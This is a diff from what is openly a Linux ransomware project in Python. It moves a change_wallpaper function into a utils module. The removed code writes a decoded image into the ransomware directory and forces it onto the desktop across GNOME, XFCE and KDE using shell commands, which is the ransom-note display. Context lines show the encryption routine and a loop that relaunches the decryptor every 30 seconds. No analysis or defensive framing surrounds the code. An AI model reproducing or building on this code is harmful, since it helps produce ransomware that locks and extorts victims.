@@ -48,34 +48,6 @@ def open_decryptor():
     os.system('xfce4-terminal --command=./decryptor')
 
 
-def change_wallpaper():
-    with open(os.path.join(variables.ransomware_path, "img.png"), 'wb') as f:
-        f.write(base64.b64decode(variables.img))
-    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
-            .format(os.path.join(variables.ransomware_path, "img.png"))
-    
-    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''\
-            .format(os.path.join(variables.ransomware_path, "img.png"))
-    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'\
-            .format(os.path.join(variables.ransomware_path, "img.png"))
-
-    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
-var Desktops = desktops();                                                                                                                       
-for (i=0;i<Desktops.length;i++) {
-        d = Desktops[i];
-        d.wallpaperPlugin = "org.kde.image";
-        d.currentConfigGroup = Array("Wallpaper",
-                                    "org.kde.image",
-                                    "General");
-        d.writeConfig("Image", "file://%s");
-}'
-""" %(os.path.join(variables.ransomware_path, "img.png"))
-    os.system(gnome)
-    os.system(xfce)
-    os.system(xfce1)
-    os.system(kde)
-
-
 def start_encryption(files):
     if(not files):
         return None
@@ -136,7 +108,7 @@ if __name__ == "__main__":
     while True:
         try:
             menu()
-            change_wallpaper()
+            utils.change_wallpaper()
             open_decryptor()
             time.sleep(30)
         except:
